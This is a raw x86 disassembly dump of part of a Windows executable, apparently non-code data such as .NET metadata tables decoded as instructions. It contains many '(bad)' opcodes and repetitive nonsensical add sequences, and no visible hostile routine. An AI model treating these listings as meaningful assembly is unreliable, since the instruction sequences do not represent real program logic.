  4036f9:	00 73 0b             	add    %dh,0xb(%ebx)
  4036fc:	f4                   	hlt
  4036fd:	0f 0a                	(bad)
  4036ff:	00 8b 02 f4 0f 1a    	add    %cl,0x1a0ff402(%ebx)
  403705:	00 18                	add    %bl,(%eax)
  403707:	02 f4                	add    %ah,%dh
  403709:	0f 12 00             	movlps (%eax),%xmm0
  40370c:	b5 0b                	mov    $0xb,%ch
  40370e:	4f                   	dec    %edi
  40370f:	0d 1a 00 96 0c       	or     $0xc96001a,%eax
  403714:	f4                   	hlt
  403715:	0f 0a                	(bad)
  403717:	00 43 04             	add    %al,0x4(%ebx)
  40371a:	d6                   	salc
  40371b:	0e                   	push   %cs
  40371c:	06                   	push   %es
  40371d:	00 fa                	add    %bh,%dl
  40371f:	11 16                	adc    %edx,(%esi)
  403721:	0b 12                	or     (%edx),%edx
  403723:	00 59 04             	add    %bl,0x4(%ecx)
  403726:	ec                   	in     (%dx),%al
  403727:	0a 00                	or     (%eax),%al
  403729:	00 00                	add    %al,(%eax)
  40372b:	00 d6                	add    %dl,%dh
  40372d:	00 00                	add    %al,(%eax)
  40372f:	00 00                	add    %al,(%eax)
  403731:	00 01                	add    %al,(%ecx)
  403733:	00 01                	add    %al,(%ecx)
  403735:	00 80 01 10 00 1d    	add    %al,0x1d001001(%eax)
  40373b:	01 00                	add    %eax,(%eax)
  40373d:	00 45 00             	add    %al,0x0(%ebp)
  403740:	01 00                	add    %eax,(%eax)
  403742:	01 00                	add    %eax,(%eax)
  403744:	01 00                	add    %eax,(%eax)
  403746:	10 00                	adc    %al,(%eax)
  403748:	d5 0b                	aad    $0xb
  40374a:	0d 0c 8d 00 02       	or     $0x2008d0c,%eax
  40374f:	00 13                	add    %dl,(%ebx)
  403751:	00 01                	add    %al,(%ecx)
  403753:	00 10                	add    %dl,(%eax)
  403755:	00 8a 11 0d 0c 9d    	add    %cl,-0x62f3f2ef(%edx)
  40375b:	00 02                	add    %al,(%edx)
  40375d:	00 16                	add    %dl,(%esi)
  40375f:	00 00                	add    %al,(%eax)
  403761:	00 10                	add    %dl,(%eax)
  403763:	00 b0 0d 2a 0e 45    	add    %dh,0x450e2a0d(%eax)
  403769:	00 0b                	add    %cl,(%ebx)
  40376b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40376e:	00 01                	add    %al,(%ecx)
  403770:	10 00                	adc    %al,(%eax)
  403772:	3b 0f                	cmp    (%edi),%ecx
  403774:	2a 0e                	sub    (%esi),%cl
  403776:	d5 00                	aad    $0x0
  403778:	0d 00 20 00 03       	or     $0x3002000,%eax
  40377d:	01 00                	add    %eax,(%eax)
  40377f:	00 1f                	add    %bl,(%edi)
  403781:	05 00 00 61 00       	add    $0x610000,%eax
  403786:	0e                   	push   %cs
  403787:	00 23                	add    %ah,(%ebx)
  403789:	00 0b                	add    %cl,(%ebx)
  40378b:	01 10                	add    %edx,(%eax)
  40378d:	00 07                	add    %al,(%edi)
  40378f:	01 00                	add    %eax,(%eax)
  403791:	00 6d 00             	add    %ch,0x0(%ebp)
  403794:	0e                   	push   %cs
  403795:	00 27                	add    %ah,(%edi)
  403797:	00 0b                	add    %cl,(%ebx)
  403799:	01 10                	add    %edx,(%eax)
  40379b:	00 f3                	add    %dh,%bl
  40379d:	00 00                	add    %al,(%eax)
  40379f:	00 6d 00             	add    %ch,0x0(%ebp)
  4037a2:	20 00                	and    %al,(%eax)
  4037a4:	27                   	daa
  4037a5:	00 0b                	add    %cl,(%ebx)
  4037a7:	01 10                	add    %edx,(%eax)
  4037a9:	00 df                	add    %bl,%bh
  4037ab:	00 00                	add    %al,(%eax)
  4037ad:	00 6d 00             	add    %ch,0x0(%ebp)
  4037b0:	24 00                	and    $0x0,%al
  4037b2:	27                   	daa
  4037b3:	00 03                	add    %al,(%ebx)
  4037b5:	01 00                	add    %eax,(%eax)
  4037b7:	00 74 05 00          	add    %dh,0x0(%ebp,%eax,1)
  4037bb:	00 61 00             	add    %ah,0x0(%ecx)
  4037be:	27                   	daa
  4037bf:	00 27                	add    %ah,(%edi)
  4037c1:	00 03                	add    %al,(%ebx)
  4037c3:	01 00                	add    %eax,(%eax)
  4037c5:	00 bf 04 00 00 61    	add    %bh,0x61000004(%edi)
  4037cb:	00 27                	add    %ah,(%edi)
  4037cd:	00 2b                	add    %ch,(%ebx)
  4037cf:	00 03                	add    %al,(%ebx)
  4037d1:	01 00                	add    %eax,(%eax)
  4037d3:	00 f2                	add    %dh,%dl
  4037d5:	04 00                	add    $0x0,%al
  4037d7:	00 61 00             	add    %ah,0x0(%ecx)
  4037da:	27                   	daa
  4037db:	00 2f                	add    %ch,(%edi)
  4037dd:	00 03                	add    %al,(%ebx)
  4037df:	01 00                	add    %eax,(%eax)
  4037e1:	00 89 04 00 00 61    	add    %cl,0x61000004(%ecx)
  4037e7:	00 27                	add    %ah,(%edi)
  4037e9:	00 33                	add    %dh,(%ebx)
  4037eb:	00 03                	add    %al,(%ebx)
  4037ed:	01 00                	add    %eax,(%eax)
  4037ef:	00 9c 04 00 00 61 00 	add    %bl,0x610000(%esp,%eax,1)
  4037f6:	27                   	daa
  4037f7:	00 37                	add    %dh,(%edi)
  4037f9:	00 03                	add    %al,(%ebx)
  4037fb:	01 00                	add    %eax,(%eax)
  4037fd:	00 75 04             	add    %dh,0x4(%ebp)
  403800:	00 00                	add    %al,(%eax)
  403802:	61                   	popa
  403803:	00 27                	add    %ah,(%edi)
  403805:	00 3b                	add    %bh,(%ebx)
  403807:	00 03                	add    %al,(%ebx)
  403809:	01 00                	add    %eax,(%eax)
  40380b:	00 8a 05 00 00 61    	add    %cl,0x61000005(%edx)
  403811:	00 27                	add    %ah,(%edi)
  403813:	00 3f                	add    %bh,(%edi)
  403815:	00 03                	add    %al,(%ebx)
  403817:	01 00                	add    %eax,(%eax)
  403819:	00 d8                	add    %bl,%al
  40381b:	04 00                	add    $0x0,%al
  40381d:	00 61 00             	add    %ah,0x0(%ecx)
  403820:	27                   	daa
  403821:	00 43 00             	add    %al,0x0(%ebx)
  403824:	03 01                	add    (%ecx),%eax
  403826:	00 00                	add    %al,(%eax)
  403828:	4b                   	dec    %ebx
  403829:	05 00 00 61 00       	add    $0x610000,%eax
  40382e:	27                   	daa
  40382f:	00 47 00             	add    %al,0x0(%edi)
  403832:	03 01                	add    (%ecx),%eax
  403834:	00 00                	add    %al,(%eax)
  403836:	60                   	pusha
  403837:	05 00 00 61 00       	add    $0x610000,%eax
  40383c:	27                   	daa
  40383d:	00 4b 00             	add    %cl,0x0(%ebx)
  403840:	03 01                	add    (%ecx),%eax
  403842:	00 00                	add    %al,(%eax)
  403844:	ae                   	scas   %es:(%edi),%al
  403845:	04 00                	add    $0x0,%al
  403847:	00 61 00             	add    %ah,0x0(%ecx)
  40384a:	27                   	daa
  40384b:	00 4f 00             	add    %cl,0x0(%edi)
  40384e:	03 01                	add    (%ecx),%eax
  403850:	00 00                	add    %al,(%eax)
  403852:	08 05 00 00 61 00    	or     %al,0x610000
  403858:	27                   	daa
  403859:	00 53 00             	add    %dl,0x0(%ebx)
  40385c:	83 01 10             	addl   $0x10,(%ecx)
  40385f:	00 18                	add    %bl,(%eax)
  403861:	00 00                	add    %al,(%eax)
  403863:	00 45 00             	add    %al,0x0(%ebp)
  403866:	27                   	daa
  403867:	00 57 00             	add    %dl,0x0(%edi)
  40386a:	11 00                	adc    %eax,(%eax)
  40386c:	d9 01                	flds   (%ecx)
  40386e:	55                   	push   %ebp
  40386f:	03 03                	add    (%ebx),%eax
  403871:	00 b1 00 58 03 03    	add    %dh,0x3035800(%ecx)
  403877:	00 c8                	add    %cl,%al
  403879:	00 58 03             	add    %bl,0x3(%eax)
  40387c:	03 00                	add    (%eax),%eax
  40387e:	09 00                	or     %eax,(%eax)
  403880:	58                   	pop    %eax
  403881:	03 03                	add    (%ebx),%eax
  403883:	00 de                	add    %bl,%dh
  403885:	03 5d 03             	add    0x3(%ebp),%ebx
  403888:	03 00                	add    (%eax),%eax
  40388a:	a2 05 62 03 03       	mov    %al,0x3036205
  40388f:	00 ba 09 67 03 03    	add    %bh,0x3036709(%edx)
  403895:	00 0d 12 62 03 03    	add    %cl,0x3036212
  40389b:	00 70 0a             	add    %dh,0xa(%eax)
  40389e:	62 03                	bound  %eax,(%ebx)
  4038a0:	01 00                	add    %eax,(%eax)
  4038a2:	87 01                	xchg   %eax,(%ecx)
  4038a4:	55                   	push   %ebp
  4038a5:	03 11                	add    (%ecx),%edx
  4038a7:	00 64 0a 6c          	add    %ah,0x6c(%edx,%ecx,1)
  4038ab:	03 11                	add    (%ecx),%edx
  4038ad:	00 33                	add    %dh,(%ebx)
  4038af:	04 71                	add    $0x71,%al
  4038b1:	03 11                	add    (%ecx),%edx
  4038b3:	00 4c 02 76          	add    %cl,0x76(%edx,%eax,1)
  4038b7:	03 06                	add    (%esi),%eax
  4038b9:	00 34 01             	add    %dh,(%ecx,%eax,1)
  4038bc:	7a 03                	jp     0x4038c1
  4038be:	06                   	push   %es
  4038bf:	00 e9                	add    %ch,%cl
  4038c1:	01 86 01 06 00 cb    	add    %eax,-0x34fff9ff(%esi)
  4038c7:	0b 86 01 06 00 31    	or     0x31000601(%esi),%eax
  4038cd:	03 86 01 06 00 1f    	add    0x1f000601(%esi),%eax
  4038d3:	01 7a 03             	add    %edi,0x3(%edx)
  4038d6:	06                   	push   %es
  4038d7:	00 23                	add    %ah,(%ebx)
  4038d9:	01 7a 03             	add    %edi,0x3(%edx)
  4038dc:	06                   	push   %es
  4038dd:	00 8e 08 7a 03 06    	add    %cl,0x6037a08(%esi)
  4038e3:	00 96 08 7a 03 06    	add    %dl,0x6037a08(%esi)
  4038e9:	00 9f 0f 7a 03 06    	add    %bl,0x6037a0f(%edi)
  4038ef:	00 ad 0f 7a 03 06    	add    %ch,0x6037a0f(%ebp)
  4038f5:	00 d0                	add    %dl,%al
  4038f7:	06                   	push   %es
  4038f8:	7a 03                	jp     0x4038fd
  4038fa:	06                   	push   %es
  4038fb:	00 33                	add    %dh,(%ebx)
  4038fd:	0f 7a                	(bad)
  4038ff:	03 06                	add    (%esi),%eax
  403901:	00 95 11 7d 03 06    	add    %dl,0x6037d11(%ebp)
  403907:	00 68 00             	add    %ch,0x0(%eax)
  40390a:	7d 03                	jge    0x40390f
  40390c:	06                   	push   %es
  40390d:	00 74 00 86          	add    %dh,-0x7a(%eax,%eax,1)
  403911:	01 06                	add    %eax,(%esi)
  403913:	00 3b                	add    %bh,(%ebx)
  403915:	11 86 01 06 00 45    	adc    %eax,0x45000601(%esi)
  40391b:	11 86 01 06 00 ec    	adc    %eax,-0x13fff9ff(%esi)
  403921:	0c 86                	or     $0x86,%al
  403923:	01 06                	add    %eax,(%esi)
  403925:	00 cb                	add    %cl,%bl
  403927:	0f 86 01 06 00 7f    	jbe    0x7f403f2e
  40392d:	01 86 01 06 00 73    	add    %eax,0x73000601(%esi)
  403933:	01 7a 03             	add    %edi,0x3(%edx)
  403936:	06                   	push   %es
  403937:	00 5b 01             	add    %bl,0x1(%ebx)
  40393a:	7a 03                	jp     0x40393f
  40393c:	06                   	push   %es
  40393d:	00 55 09             	add    %dl,0x9(%ebp)
  403940:	80 03 06             	addb   $0x6,(%ebx)
  403943:	00 4e 09             	add    %cl,0x9(%esi)
  403946:	80 03 06             	addb   $0x6,(%ebx)
  403949:	00 6d 0c             	add    %ch,0xc(%ebp)
  40394c:	86 01                	xchg   %al,(%ecx)
  40394e:	16                   	push   %ss
  40394f:	00 11                	add    %dl,(%ecx)
  403951:	00 83 03 16 00 1f    	add    %al,0x1f001603(%ebx)
  403957:	00 93 03 16 00 61    	add    %dl,0x61001603(%ebx)
  40395d:	00 93 03 16 00 80    	add    %dl,-0x7fffe9fd(%ebx)
  403963:	00 a3 03 16 00 8e    	add    %ah,-0x71ffe9fd(%ebx)
  403969:	00 83 03 16 00 9c    	add    %al,-0x63ffe9fd(%ebx)
  40396f:	00 93 03 16 00 a3    	add    %dl,-0x5cffe9fd(%ebx)
  403975:	00 93 03 16 00 aa    	add    %dl,-0x55ffe9fd(%ebx)
  40397b:	00 a3 03 16 00 c1    	add    %ah,-0x3effe9fd(%ebx)
  403981:	00 b3 03 16 00 cf    	add    %dh,-0x30ffe9fd(%ebx)
  403987:	00 93 03 16 00 01    	add    %dl,0x1001603(%ebx)
  40398d:	00 c5                	add    %al,%ch
  40398f:	03 50 20             	add    0x20(%eax),%edx
  403992:	00 00                	add    %al,(%eax)
  403994:	00 00                	add    %al,(%eax)
  403996:	91                   	xchg   %eax,%ecx
  403997:	00 ee                	add    %ch,%dh
  403999:	00 82 01 01 00 28    	add    %al,0x28000101(%edx)
  40399f:	25 00 00 00 00       	and    $0x0,%eax
  4039a4:	91                   	xchg   %eax,%ecx
  4039a5:	00 88 0c 82 01 01    	add    %cl,0x101820c(%eax)
  4039ab:	00 bc 25 00 00 00 00 	add    %bh,0x0(%ebp,%eiz,1)
  4039b2:	91                   	xchg   %eax,%ecx
  4039b3:	00 54 0f d6          	add    %dl,-0x2a(%edi,%ecx,1)
  4039b7:	03 01                	add    (%ecx),%eax
  4039b9:	00 d4                	add    %dl,%ah
  4039bb:	25 00 00 00 00       	and    $0x0,%eax
  4039c0:	91                   	xchg   %eax,%ecx
  4039c1:	00 31                	add    %dh,(%ecx)
  4039c3:	01 da                	add    %ebx,%edx
  4039c5:	03 01                	add    (%ecx),%eax
  4039c7:	00 04 26             	add    %al,(%esi,%eiz,1)
  4039ca:	00 00                	add    %al,(%eax)
  4039cc:	00 00                	add    %al,(%eax)
  4039ce:	91                   	xchg   %eax,%ecx
  4039cf:	00 4c 0d e1          	add    %cl,-0x1f(%ebp,%ecx,1)
  4039d3:	03 03                	add    (%ebx),%eax
  4039d5:	00 3e                	add    %bh,(%esi)
  4039d7:	26 00 00             	add    %al,%es:(%eax)
  4039da:	00 00                	add    %al,(%eax)
  4039dc:	91                   	xchg   %eax,%ecx
  4039dd:	00 5c 00 e7          	add    %bl,-0x19(%eax,%eax,1)
  4039e1:	03 05 00 00 00 00    	add    0x0,%eax
  4039e7:	00 80 00 91 20 d4    	add    %al,-0x2bdf6f00(%eax)
  4039ed:	0f ed 03             	paddsw (%ebx),%mm0
  4039f0:	07                   	pop    %es
  4039f1:	00 00                	add    %al,(%eax)
  4039f3:	00 00                	add    %al,(%eax)
  4039f5:	00 80 00 91 20 df    	add    %al,-0x20df6f00(%eax)
  4039fb:	02 f3                	add    %bl,%dh
  4039fd:	03 09                	add    (%ecx),%ecx
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 00                	add    %al,(%eax)
  403a03:	00 80 00 91 20 15    	add    %al,0x15209100(%eax)
  403a09:	12 f3                	adc    %bl,%dh
  403a0b:	03 0a                	add    (%edx),%ecx
  403a0d:	00 50 26             	add    %dl,0x26(%eax)
  403a10:	00 00                	add    %al,(%eax)
  403a12:	00 00                	add    %al,(%eax)
  403a14:	91                   	xchg   %eax,%ecx
  403a15:	00 37                	add    %dh,(%edi)
  403a17:	08 fa                	or     %bh,%dl
  403a19:	02 0b                	add    (%ebx),%cl
  403a1b:	00 18                	add    %bl,(%eax)
  403a1d:	27                   	daa
  403a1e:	00 00                	add    %al,(%eax)
  403a20:	00 00                	add    %al,(%eax)
  403a22:	91                   	xchg   %eax,%ecx
  403a23:	00 18                	add    %bl,(%eax)
  403a25:	08 f8                	or     %bh,%al
  403a27:	03 0c 00             	add    (%eax,%eax,1),%ecx
  403a2a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a2b:	28 00                	sub    %al,(%eax)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	00 91 00 59 08 9e    	add    %dl,-0x61f7a700(%ecx)
  403a35:	02 0e                	add    (%esi),%cl
  403a37:	00 28                	add    %ch,(%eax)
  403a39:	29 00                	sub    %eax,(%eax)
  403a3b:	00 00                	add    %al,(%eax)
  403a3d:	00 91 00 28 08 ff    	add    %dl,-0xf7d800(%ecx)
  403a43:	03 0f                	add    (%edi),%ecx
  403a45:	00 a8 29 00 00 00    	add    %ch,0x29(%eax)
  403a4b:	00 91 00 45 08 05    	add    %dl,0x5084500(%ecx)
  403a51:	04 11                	add    $0x11,%al
  403a53:	00 28                	add    %ch,(%eax)
  403a55:	2a 00                	sub    (%eax),%al
  403a57:	00 00                	add    %al,(%eax)
  403a59:	00 91 00 d6 11 98    	add    %dl,-0x67ee2a00(%ecx)
  403a5f:	01 13                	add    %edx,(%ebx)
  403a61:	00 a4 2a 00 00 00 00 	add    %ah,0x0(%edx,%ebp,1)
  403a68:	91                   	xchg   %eax,%ecx
  403a69:	00 5c 02 ff          	add    %bl,-0x1(%edx,%eax,1)
  403a6d:	03 14 00             	add    (%eax,%eax,1),%edx
  403a70:	64 2d 00 00 00 00    	fs sub $0x0,%eax
  403a76:	91                   	xchg   %eax,%ecx
  403a77:	00 be 08 9e 02 16    	add    %bh,0x16029e08(%esi)
  403a7d:	00 9c 2d 00 00 00 00 	add    %bl,0x0(%ebp,%ebp,1)
  403a84:	96                   	xchg   %eax,%esi
  403a85:	00 7f 11             	add    %bh,0x11(%edi)
  403a88:	d6                   	salc
  403a89:	03 17                	add    (%edi),%edx
  403a8b:	00 7c 30 00          	add    %bh,0x0(%eax,%esi,1)
  403a8f:	00 00                	add    %al,(%eax)
  403a91:	00 86 00 01 11 06    	add    %al,0x6110100(%esi)
  403a97:	00 17                	add    %dl,(%edi)
  403a99:	00 8f 30 00 00 00    	add    %cl,0x30(%edi)
  403a9f:	00 96 00 8f 0a d6    	add    %dl,-0x29f57100(%esi)
  403aa5:	03 17                	add    (%edi),%edx
  403aa7:	00 a2 30 00 00 00    	add    %ah,0x30(%edx)
  403aad:	00 86 18 1a 0d 06    	add    %al,0x60d1a18(%esi)
  403ab3:	00 17                	add    %dl,(%edi)
  403ab5:	00 aa 30 00 00 00    	add    %ch,0x30(%edx)
  403abb:	00 86 18 1a 0d 06    	add    %al,0x60d1a18(%esi)
  403ac1:	00 17                	add    %dl,(%edi)
  403ac3:	00 b8 30 00 00 00    	add    %bh,0x30(%eax)
  403ac9:	00 81 00 8c 09 0b    	add    %al,0xb098c00(%ecx)
  403acf:	04 17                	add    $0x17,%al
  403ad1:	00 10                	add    %dl,(%eax)
  403ad3:	32 00                	xor    (%eax),%al
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	00 81 00 ac 09 0b    	add    %al,0xb09ac00(%ecx)
  403add:	04 19                	add    $0x19,%al
  403adf:	00 47 32             	add    %al,0x32(%edi)
  403ae2:	00 00                	add    %al,(%eax)
  403ae4:	00 00                	add    %al,(%eax)
  403ae6:	81 00 9e 09 0b 04    	addl   $0x40b099e,(%eax)
  403aec:	1b 00                	sbb    (%eax),%eax
  403aee:	80 32 00             	xorb   $0x0,(%edx)
  403af1:	00 00                	add    %al,(%eax)
  403af3:	00 e6                	add    %ah,%dh
  403af5:	01 01                	add    %eax,(%ecx)
  403af7:	11 06                	adc    %eax,(%esi)
  403af9:	00 1d 00 b0 32 00    	add    %bl,0x32b000
  403aff:	00 00                	add    %al,(%eax)
  403b01:	00 e1                	add    %ah,%cl
  403b03:	01 19                	add    %ebx,(%ecx)
  403b05:	10 2e                	adc    %ch,(%esi)
  403b07:	00 1d 00 9e 33 00    	add    %bl,0x339e00
  403b0d:	00 00                	add    %al,(%eax)
  403b0f:	00 83 18 1a 0d 06    	add    %al,0x60d1a18(%ebx)
  403b15:	00 1f                	add    %bl,(%edi)
  403b17:	00 a6 33 00 00 00    	add    %ah,0x33(%esi)
  403b1d:	00 93 08 74 0c 13    	add    %dl,0x130c7408(%ebx)
  403b23:	04 1f                	add    $0x1f,%al
  403b25:	00 d2                	add    %dl,%dl
  403b27:	33 00                	xor    (%eax),%eax
  403b29:	00 00                	add    %al,(%eax)
  403b2b:	00 93 08 1b 04 19    	add    %dl,0x19041b08(%ebx)
  403b31:	04 1f                	add    $0x1f,%al
  403b33:	00 d9                	add    %bl,%cl
  403b35:	33 00                	xor    (%eax),%eax
  403b37:	00 00                	add    %al,(%eax)
  403b39:	00 93 08 27 04 1f    	add    %dl,0x1f042708(%ebx)
  403b3f:	04 1f                	add    $0x1f,%al
  403b41:	00 e1                	add    %ah,%cl
  403b43:	33 00                	xor    (%eax),%eax
  403b45:	00 00                	add    %al,(%eax)
  403b47:	00 96 08 8e 10 26    	add    %dl,0x26108e08(%esi)
  403b4d:	04 20                	add    $0x20,%al
  403b4f:	00 e8                	add    %ch,%al
  403b51:	33 00                	xor    (%eax),%eax
  403b53:	00 00                	add    %al,(%eax)
  403b55:	00 86 18 1a 0d 06    	add    %al,0x60d1a18(%esi)
  403b5b:	00 20                	add    %ah,(%eax)
  403b5d:	00 f0                	add    %dh,%al
  403b5f:	33 00                	xor    (%eax),%eax
  403b61:	00 00                	add    %al,(%eax)
  403b63:	00 91 18 20 0d d6    	add    %dl,-0x29f2dfe8(%ecx)
  403b69:	03 20                	add    (%eax),%esp
  403b6b:	00 00                	add    %al,(%eax)
  403b6d:	00 00                	add    %al,(%eax)
  403b6f:	00 03                	add    %al,(%ebx)
  403b71:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403b77:	03 20                	add    (%eax),%esp
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 03                	add    %al,(%ebx)
  403b7f:	00 c6                	add    %al,%dh
  403b81:	01 b6 02 76 01 22    	add    %esi,0x22017602(%esi)
  403b87:	00 00                	add    %al,(%eax)
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	00 03                	add    %al,(%ebx)
  403b8d:	00 c6                	add    %al,%dh
  403b8f:	01 b1 02 2b 04 22    	add    %esi,0x22042b02(%ecx)
  403b95:	00 00                	add    %al,(%eax)
  403b97:	00 00                	add    %al,(%eax)
  403b99:	00 03                	add    %al,(%ebx)
  403b9b:	00 c6                	add    %al,%dh
  403b9d:	01 a7 02 33 04 24    	add    %esp,0x24043302(%edi)
  403ba3:	00 00                	add    %al,(%eax)
  403ba5:	00 00                	add    %al,(%eax)
  403ba7:	00 03                	add    %al,(%ebx)
  403ba9:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403baf:	03 25 00 00 00 00    	add    0x0,%esp
  403bb5:	00 03                	add    %al,(%ebx)
  403bb7:	00 c6                	add    %al,%dh
  403bb9:	01 b6 02 39 04 27    	add    %esi,0x27043902(%esi)
  403bbf:	00 00                	add    %al,(%eax)
  403bc1:	00 00                	add    %al,(%eax)
  403bc3:	00 03                	add    %al,(%ebx)
  403bc5:	00 c6                	add    %al,%dh
  403bc7:	01 b1 02 45 04 2d    	add    %esi,0x2d044502(%ecx)
  403bcd:	00 00                	add    %al,(%eax)
  403bcf:	00 00                	add    %al,(%eax)
  403bd1:	00 03                	add    %al,(%ebx)
  403bd3:	00 c6                	add    %al,%dh
  403bd5:	01 a7 02 55 04 35    	add    %esp,0x35045502(%edi)
  403bdb:	00 00                	add    %al,(%eax)
  403bdd:	00 00                	add    %al,(%eax)
  403bdf:	00 03                	add    %al,(%ebx)
  403be1:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403be7:	03 37                	add    (%edi),%esi
  403be9:	00 00                	add    %al,(%eax)
  403beb:	00 00                	add    %al,(%eax)
  403bed:	00 03                	add    %al,(%ebx)
  403bef:	00 c6                	add    %al,%dh
  403bf1:	01 b6 02 5e 04 39    	add    %esi,0x39045e02(%esi)
  403bf7:	00 00                	add    %al,(%eax)
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 03                	add    %al,(%ebx)
  403bfd:	00 c6                	add    %al,%dh
  403bff:	01 b1 02 65 04 3b    	add    %esi,0x3b046502(%ecx)
  403c05:	00 00                	add    %al,(%eax)
  403c07:	00 00                	add    %al,(%eax)
  403c09:	00 03                	add    %al,(%ebx)
  403c0b:	00 c6                	add    %al,%dh
  403c0d:	01 a7 02 70 04 3f    	add    %esp,0x3f047002(%edi)
  403c13:	00 00                	add    %al,(%eax)
  403c15:	00 00                	add    %al,(%eax)
  403c17:	00 03                	add    %al,(%ebx)
  403c19:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403c1f:	03 41 00             	add    0x0(%ecx),%eax
  403c22:	00 00                	add    %al,(%eax)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	03 00                	add    (%eax),%eax
  403c28:	c6 01 b6             	movb   $0xb6,(%ecx)
  403c2b:	02 78 04             	add    0x4(%eax),%bh
  403c2e:	43                   	inc    %ebx
  403c2f:	00 00                	add    %al,(%eax)
  403c31:	00 00                	add    %al,(%eax)
  403c33:	00 03                	add    %al,(%ebx)
  403c35:	00 c6                	add    %al,%dh
  403c37:	01 b1 02 8a 04 4d    	add    %esi,0x4d048a02(%ecx)
  403c3d:	00 00                	add    %al,(%eax)
  403c3f:	00 00                	add    %al,(%eax)
  403c41:	00 03                	add    %al,(%ebx)
  403c43:	00 c6                	add    %al,%dh
  403c45:	01 a7 02 a0 04 59    	add    %esp,0x5904a002(%edi)
  403c4b:	00 00                	add    %al,(%eax)
  403c4d:	00 00                	add    %al,(%eax)
  403c4f:	00 03                	add    %al,(%ebx)
  403c51:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403c57:	03 5c 00 00          	add    0x0(%eax,%eax,1),%ebx
  403c5b:	00 00                	add    %al,(%eax)
  403c5d:	00 03                	add    %al,(%ebx)
  403c5f:	00 c6                	add    %al,%dh
  403c61:	01 b6 02 ac 04 5e    	add    %esi,0x5e04ac02(%esi)
  403c67:	00 00                	add    %al,(%eax)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	00 03                	add    %al,(%ebx)
  403c6d:	00 c6                	add    %al,%dh
  403c6f:	01 b1 02 b7 04 65    	add    %esi,0x6504b702(%ecx)
  403c75:	00 00                	add    %al,(%eax)
  403c77:	00 00                	add    %al,(%eax)
  403c79:	00 03                	add    %al,(%ebx)
  403c7b:	00 c6                	add    %al,%dh
  403c7d:	01 a7 02 c6 04 6e    	add    %esp,0x6e04c602(%edi)
  403c83:	00 00                	add    %al,(%eax)
  403c85:	00 00                	add    %al,(%eax)
  403c87:	00 03                	add    %al,(%ebx)
  403c89:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403c8f:	03 6f 00             	add    0x0(%edi),%ebp
  403c92:	00 00                	add    %al,(%eax)
  403c94:	00 00                	add    %al,(%eax)
  403c96:	03 00                	add    (%eax),%eax
  403c98:	c6 01 b6             	movb   $0xb6,(%ecx)
  403c9b:	02 cc                	add    %ah,%cl
  403c9d:	04 71                	add    $0x71,%al
  403c9f:	00 00                	add    %al,(%eax)
  403ca1:	00 00                	add    %al,(%eax)
  403ca3:	00 03                	add    %al,(%ebx)
  403ca5:	00 c6                	add    %al,%dh
  403ca7:	01 b1 02 d7 04 76    	add    %esi,0x7604d702(%ecx)
  403cad:	00 00                	add    %al,(%eax)
  403caf:	00 00                	add    %al,(%eax)
  403cb1:	00 03                	add    %al,(%ebx)
  403cb3:	00 c6                	add    %al,%dh
  403cb5:	01 a7 02 e6 04 7d    	add    %esp,0x7d04e602(%edi)
  403cbb:	00 00                	add    %al,(%eax)
  403cbd:	00 00                	add    %al,(%eax)
  403cbf:	00 03                	add    %al,(%ebx)
  403cc1:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403cc7:	03 7f 00             	add    0x0(%edi),%edi
  403cca:	00 00                	add    %al,(%eax)
  403ccc:	00 00                	add    %al,(%eax)
  403cce:	03 00                	add    (%eax),%eax
  403cd0:	c6 01 b6             	movb   $0xb6,(%ecx)
  403cd3:	02 ee                	add    %dh,%ch
  403cd5:	04 81                	add    $0x81,%al
  403cd7:	00 00                	add    %al,(%eax)
  403cd9:	00 00                	add    %al,(%eax)
  403cdb:	00 03                	add    %al,(%ebx)
  403cdd:	00 c6                	add    %al,%dh
  403cdf:	01 b1 02 f3 04 82    	add    %esi,-0x7dfb0cfe(%ecx)
  403ce5:	00 00                	add    %al,(%eax)
  403ce7:	00 00                	add    %al,(%eax)
  403ce9:	00 03                	add    %al,(%ebx)
  403ceb:	00 c6                	add    %al,%dh
  403ced:	01 a7 02 33 04 85    	add    %esp,-0x7afbccfe(%edi)
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 00                	add    %al,(%eax)
  403cf7:	00 03                	add    %al,(%ebx)
  403cf9:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403cff:	03 86 00 00 00 00    	add    0x0(%esi),%eax
  403d05:	00 03                	add    %al,(%ebx)
  403d07:	00 c6                	add    %al,%dh
  403d09:	01 b6 02 fc 04 88    	add    %esi,-0x77fb03fe(%esi)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 00                	add    %al,(%eax)
  403d13:	00 03                	add    %al,(%ebx)
  403d15:	00 c6                	add    %al,%dh
  403d17:	01 b1 02 02 05 8a    	add    %esi,-0x75fafdfe(%ecx)
  403d1d:	00 00                	add    %al,(%eax)
  403d1f:	00 00                	add    %al,(%eax)
  403d21:	00 03                	add    %al,(%ebx)
  403d23:	00 c6                	add    %al,%dh
  403d25:	01 a7 02 33 04 8e    	add    %esp,-0x71fbccfe(%edi)
  403d2b:	00 00                	add    %al,(%eax)
  403d2d:	00 00                	add    %al,(%eax)
  403d2f:	00 03                	add    %al,(%ebx)
  403d31:	00 86 18 1a 0d 16    	add    %al,0x160d1a18(%esi)
  403d37:	03 8f 00 00 00 00    	add    0x0(%edi),%ecx
  403d3d:	00 03                	add    %al,(%ebx)
  403d3f:	00 c6                	add    %al,%dh
  403d41:	01 b6 02 0c 05 91    	add    %esi,-0x6efaf3fe(%esi)
  403d47:	00 00                	add    %al,(%eax)
